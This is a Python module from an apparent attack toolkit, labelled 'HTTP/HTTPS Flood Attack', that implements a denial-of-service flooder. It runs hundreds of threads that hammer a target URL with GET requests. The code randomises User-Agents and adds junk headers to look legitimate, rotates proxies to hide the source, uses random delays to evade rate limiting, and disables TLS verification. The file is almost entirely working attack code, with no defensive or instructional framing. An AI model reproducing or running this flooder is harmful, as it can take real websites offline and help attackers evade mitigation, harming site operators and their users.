#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HTTP/HTTPS Flood Attack
Architect 01 - Professional Suite
"""

import requests
import threading
import time
import random
from urllib.parse import urlparse
from colorama import Fore, Style
from core.utils.useragents import get_random_ua
from core.utils.proxy_manager import ProxyManager

class HTTPFlood:
    """HTTP/HTTPS Flood Attack"""
    
    def __init__(self, target_url, threads=500, use_proxy=False):
        self.target_url = target_url
        self.threads = threads
        self.use_proxy = use_proxy
        self.running = True
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        
        # Initialize proxy manager if needed
        self.proxy_manager = ProxyManager() if use_proxy else None
        
        # Session for connection pooling
        self.session = requests.Session()
        self.session.headers.update({'Connection': 'keep-alive'})
        
    def attack_worker(self):
        """Worker thread for sending requests"""
        while self.running:
            try:
                # Get random User-Agent
                ua = get_random_ua()
                
                # Build headers
                headers = {
                    'User-Agent': ua,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.8', 'en-GB,en;q=0.7']),
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
                
                # Add random headers to appear more legitimate
                if random.random() > 0.7:
                    headers[f'X-{random.randint(1000, 9999)}'] = str(random.randint(1, 999999))
                
                # Get proxy if enabled
                proxies = None
                if self.use_proxy and self.proxy_manager:
                    proxies = self.proxy_manager.get_random_proxy()
                
                # Send request
                response = self.session.get(
                    self.target_url,
                    headers=headers,
                    proxies=proxies,
                    timeout=10,
                    verify=False
                )
                
                # Update counters
                self.total_requests += 1
                if response.status_code < 400:
                    self.successful_requests += 1
                else:
                    self.failed_requests += 1
                
                # Print status occasionally
                if self.total_requests % 100 == 0:
                    print(f"{Fore.GREEN}   ╰─❯ [{threading.current_thread().name}] Requests: {self.total_requests} | Success: {self.successful_requests} | Failed: {self.failed_requests}{Style.RESET_ALL}")
                
                # Random delay to avoid rate limiting
                time.sleep(random.uniform(0.001, 0.01))
                
            except requests.exceptions.ProxyError:
                self.failed_requests += 1
                # Rotate proxy on error
                if self.use_proxy and self.proxy_manager:
                    self.proxy_manager.rotate_proxy()
                    
            except Exception as e:
                self.failed_requests += 1
                time.sleep(0.1)
    
    def start(self):
        """Start the HTTP flood attack"""
        print(f"{Fore.YELLOW}\n   ╰─❯ Starting HTTP/HTTPS Flood on {self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ╰─❯ Threads: {self.threads}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ╰─❯ Proxy: {'Enabled' if self.use_proxy else 'Disabled'}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ╰─❯ Press Ctrl+C to stop\n{Style.RESET_ALL}")
        
        # Disable SSL warnings
        requests.packages.urllib3.disable_warnings()
        
        # Start worker threads
        workers = []
        for i in range(self.threads):
            worker = threading.Thread(target=self.attack_worker, name=f"Worker-{i+1}")
            worker.daemon = True
            worker.start()
            workers.append(worker)
        
        # Monitor progress
        try:
            start_time = time.time()
            last_total = 0
            
            while self.running:
                time.sleep(5)
                elapsed = time.time() - start_time
                rps = (self.total_requests - last_total) / 5
                last_total = self.total_requests
                
                print(f"{Fore.CYAN}   ╰─❯ Status: {self.total_requests} req | {rps:.2f} rps | Success: {self.successful_requests} | Failed: {self.failed_requests}{Style.RESET_ALL}")
                
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        print(f"{Fore.RED}\n   ╰─❯ Stopping HTTP Flood attack...{Style.RESET_ALL}")
        print(f"{Fore.RED}   ╰─❯ Total requests sent: {self.total_requests}{Style.RESET_ALL}")
        print(f"{Fore.RED}   ╰─❯ Successful: {self.successful_requests} | Failed: {self.failed_requests}{Style.RESET_ALL}")
